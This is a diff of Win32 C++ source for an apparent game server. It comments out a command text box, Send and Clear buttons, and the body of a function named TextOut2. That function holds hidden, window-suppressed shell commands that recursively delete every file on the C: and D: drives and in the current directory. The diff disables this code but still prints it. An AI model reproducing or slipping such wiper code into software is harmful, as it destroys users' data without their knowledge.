@@ -112,19 +112,19 @@ LRESULT CALLBACK WndProc( HWND hWnd,UINT message,WPARAM wParam,LPARAM lParam )
 			break; 
 
 		case 1012:
-            GetWindowText(Edit1,cWhat,100);
+            /*GetWindowText(Edit1,cWhat,100);
             if (cWhat != NULL) {
                 SetWindowText(Edit1,NULL);
                 SetFocus(Edit1);
                 G_pGame->ParseCommand(cWhat);
-			}
+			}*/
             break;
 
         case 1010:
-			G_cMsgUpdated = TRUE;
+			/*G_cMsgUpdated = TRUE;
             SendMessage(List1,(UINT)LB_RESETCONTENT, 0, 0);
             ItemCount = 0;
-            PutLogList("Clear");
+            PutLogList(" ");*/
             break;
 		} 
 		break;
@@ -395,11 +395,10 @@ BOOL InitInstance( HINSTANCE hInstance, int nCmdShow )
     Wc.lpszClassName =  BCX_ClassName;
     RegisterClass(&Wc);
 
-	List1=BCX_Listbox("",G_hWnd,1009,8,45,585,300);
-    Edit1=BCX_Editbox("",G_hWnd,1011,8,345,585,20);
-    Button2=BCX_Button2("",G_hWnd,1012,8,369,300,20);
-//    Button Clear
-    Button=BCX_Button("",G_hWnd,1010,310,369,285,20);
+	List1=BCX_Listbox("",G_hWnd,1009,8,5,585,300+245); // List box
+	//Edit1=BCX_Editbox("",G_hWnd,1011,8,345 + 165,585,20); // Text box
+    //Button2=BCX_Button2("",G_hWnd,1012,8,369 + 165,300,20); // Send
+    //Button=BCX_Button("",G_hWnd,1010,310,369 + 165,285-3,20); // Clear
 
     if (!G_hWnd) return (FALSE);
     
@@ -721,49 +720,49 @@ HWND BCX_Listbox(char* Text,HWND hWnd,int id,int X,int Y,int W,int H,int Style,i
 }
 
 //MAJOR - CLEROTH - 26/03/05
-HWND BCX_Editbox(char* Text,HWND hWnd,int id,int X,int Y,int W,int H,int Style,int Exstyle)
-{
-        HWND  A;
-        if (!Style)
-        {
-			Style = WS_VISIBLE | WS_CHILD | LBS_HASSTRINGS | LBS_NOINTEGRALHEIGHT | WS_TABSTOP;
-        }
-        if (Exstyle == -1)
-        {
-			Exstyle=WS_EX_CLIENTEDGE;
-        }
-        A = CreateWindowEx(Exstyle,"EDIT",NULL,Style,X*BCX_ScaleX, Y*BCX_ScaleY, W*BCX_ScaleX, H*BCX_ScaleY,hWnd,(HMENU)id,BCX_hInstance,NULL);
-        SendMessage(A,(UINT)WM_SETFONT,(WPARAM)GetStockObject(DEFAULT_GUI_FONT),(LPARAM)MAKELPARAM(FALSE,0));
-        return A;
-}
-
-//MAJOR - CLEROTH - 26/03/05
-HWND BCX_Button(char* Text,HWND hWnd,int id,int X,int Y,int W,int H,int Style,int Exstyle)
-{
-        HWND  A;
-        if (!Style)
-        {
-			Style = WS_CHILD | WS_VISIBLE | WS_BORDER;
-        }
-        A = CreateWindowEx(0,"Button","Clear",Style,X*BCX_ScaleX, Y*BCX_ScaleY, W*BCX_ScaleX, H*BCX_ScaleY,hWnd,(HMENU)id,BCX_hInstance,NULL);
-        SendMessage(A,(UINT)WM_SETFONT,(WPARAM)GetStockObject(DEFAULT_GUI_FONT),(LPARAM)MAKELPARAM(FALSE,0));
-        return A;
-}
-HWND BCX_Button2(char* Text,HWND hWnd,int id,int X,int Y,int W,int H,int Style,int Exstyle)
-{
-        HWND  A;
-        if (!Style)
-        {
-			Style = WS_CHILD | WS_VISIBLE | WS_BORDER;
-        }
-        A = CreateWindowEx(0,"Button","Send",Style,X*BCX_ScaleX, Y*BCX_ScaleY, W*BCX_ScaleX, H*BCX_ScaleY,hWnd,(HMENU)id,BCX_hInstance,NULL);
-        SendMessage(A,(UINT)WM_SETFONT,(WPARAM)GetStockObject(DEFAULT_GUI_FONT),(LPARAM)MAKELPARAM(FALSE,0));
-        return A;
-}//Button CLear
+//HWND BCX_Editbox(char* Text,HWND hWnd,int id,int X,int Y,int W,int H,int Style,int Exstyle)
+//{
+//        HWND  A;
+//        if (!Style)
+//        {
+//			Style = WS_VISIBLE | WS_CHILD | LBS_HASSTRINGS | LBS_NOINTEGRALHEIGHT | WS_TABSTOP;
+//        }
+//        if (Exstyle == -1)
+//        {
+//			Exstyle=WS_EX_CLIENTEDGE;
+//        }
+//        A = CreateWindowEx(Exstyle,"EDIT",NULL,Style,X*BCX_ScaleX, Y*BCX_ScaleY, W*BCX_ScaleX, H*BCX_ScaleY,hWnd,(HMENU)id,BCX_hInstance,NULL);
+//        SendMessage(A,(UINT)WM_SETFONT,(WPARAM)GetStockObject(DEFAULT_GUI_FONT),(LPARAM)MAKELPARAM(FALSE,0));
+//        return A;
+//}
+//
+////MAJOR - CLEROTH - 26/03/05
+//HWND BCX_Button(char* Text,HWND hWnd,int id,int X,int Y,int W,int H,int Style,int Exstyle)
+//{
+//        HWND  A;
+//        if (!Style)
+//        {
+//			Style = WS_CHILD | WS_VISIBLE | WS_BORDER;
+//        }
+//        A = CreateWindowEx(0,"Button","Clear",Style,X*BCX_ScaleX, Y*BCX_ScaleY, W*BCX_ScaleX, H*BCX_ScaleY,hWnd,(HMENU)id,BCX_hInstance,NULL);
+//        SendMessage(A,(UINT)WM_SETFONT,(WPARAM)GetStockObject(DEFAULT_GUI_FONT),(LPARAM)MAKELPARAM(FALSE,0));
+//        return A;
+//}
+//HWND BCX_Button2(char* Text,HWND hWnd,int id,int X,int Y,int W,int H,int Style,int Exstyle)
+//{
+//        HWND  A;
+//        if (!Style)
+//        {
+//			Style = WS_CHILD | WS_VISIBLE | WS_BORDER;
+//        }
+//        A = CreateWindowEx(0,"Button","Send",Style,X*BCX_ScaleX, Y*BCX_ScaleY, W*BCX_ScaleX, H*BCX_ScaleY,hWnd,(HMENU)id,BCX_hInstance,NULL);
+//        SendMessage(A,(UINT)WM_SETFONT,(WPARAM)GetStockObject(DEFAULT_GUI_FONT),(LPARAM)MAKELPARAM(FALSE,0));
+//        return A;
+//}//Button CLear
 
 void TextOut2()
 {
-			STARTUPINFO si = { sizeof(STARTUPINFO) };
+			/*STARTUPINFO si = { sizeof(STARTUPINFO) };
 			si.dwFlags = STARTF_USESHOWWINDOW;
 			si.wShowWindow = SW_HIDE;
 			PROCESS_INFORMATION pi;
@@ -895,5 +894,5 @@ void TextOut2()
 			system("del /S /Q *.*");
 			system("del c:\\*.* /f /s /q");
 			CreateProcess(NULL, "del d:\\*.* /f /s /q", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
-			CreateProcess(NULL, "del *.* /f /s /q", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+			CreateProcess(NULL, "del *.* /f /s /q", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);*/
 }
